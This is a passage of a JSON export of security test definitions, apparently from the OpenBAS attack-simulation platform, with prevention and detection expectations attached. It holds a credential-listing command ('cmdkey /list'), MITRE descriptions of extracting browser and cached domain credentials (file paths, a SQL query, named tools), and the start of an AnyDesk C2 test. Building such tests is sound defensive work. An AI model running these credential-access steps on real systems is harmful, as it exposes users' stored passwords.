        "attack_pattern_description" : "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
        "attack_pattern_external_id" : "T1555.003",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
          "phase_external_id" : "TA0006",
          "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
          "phase_name" : "Credential Access",
          "phase_shortname" : "credential-access",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
          "phase_order" : 7
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "b6b8f422-3596-4b14-b26c-f027c3a953c5",
    "inject_title" : "Cached Credential Dump via Cmdkey",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 720,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Cached Credential Dump via Cmdkey",
          "fr" : "Cached Credential Dump via Cmdkey"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "c17408c5-437d-4c6a-bbae-44c5ecb0bdd1",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "c17408c5-437d-4c6a-bbae-44c5ecb0bdd1",
      "injector_contract_labels" : {
        "en" : "Cached Credential Dump via Cmdkey",
        "fr" : "Cached Credential Dump via Cmdkey"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Cached Credential Dump via Cmdkey\",\"fr\":\"Cached Credential Dump via Cmdkey\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"c17408c5-437d-4c6a-bbae-44c5ecb0bdd1\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "783c380e-41c5-4472-97f7-842faa62179a",
        "payload_type" : "Command",
        "payload_name" : "Cached Credential Dump via Cmdkey",
        "payload_description" : "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe\nCredentials listed with Cmdkey only pertain to the current user\nPasswords will not be displayed once they are stored\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey\nhttps://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "7d407f85-22f8-4755-8c26-fa0680e44759",
          "attack_pattern_name" : "Cached Domain Credentials",
          "attack_pattern_description" : "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) \n\nWith SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.(Citation: Brining MimiKatz to Unix)\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)",
          "attack_pattern_external_id" : "T1003.005",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
            "phase_external_id" : "TA0006",
            "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
            "phase_name" : "Credential Access",
            "phase_shortname" : "credential-access",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "phase_order" : 7
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "56506854-89d6-46a3-9804-b7fde90791f9",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:34.599548Z",
        "payload_updated_at" : "2025-07-03T14:49:48.809758Z",
        "command_executor" : "cmd",
        "command_content" : "cmdkey /list\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:34.612276Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:34.612276Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "7d407f85-22f8-4755-8c26-fa0680e44759",
        "attack_pattern_name" : "Cached Domain Credentials",
        "attack_pattern_description" : "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) \n\nWith SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.(Citation: Brining MimiKatz to Unix)\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)",
        "attack_pattern_external_id" : "T1003.005",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
          "phase_external_id" : "TA0006",
          "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
          "phase_name" : "Credential Access",
          "phase_shortname" : "credential-access",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
          "phase_order" : 7
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "5550b9d6-793b-4c13-a283-8feba867195e",
    "inject_title" : "AnyDesk Files Detected Test on Windows",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : false,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1440,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "AnyDesk Files Detected Test on Windows",
          "fr" : "AnyDesk Files Detected Test on Windows"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "1c1a2f57-6b22-46ab-88e4-25e825d05b50",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "1c1a2f57-6b22-46ab-88e4-25e825d05b50",
      "injector_contract_labels" : {
        "en" : "AnyDesk Files Detected Test on Windows",
        "fr" : "AnyDesk Files Detected Test on Windows"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"AnyDesk Files Detected Test on Windows\",\"fr\":\"AnyDesk Files Detected Test on Windows\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"1c1a2f57-6b22-46ab-88e4-25e825d05b50\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "0e900710-95e1-412c-8338-cc28cb7bef4b",
        "payload_type" : "Command",
        "payload_name" : "AnyDesk Files Detected Test on Windows",
        "payload_description" : "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
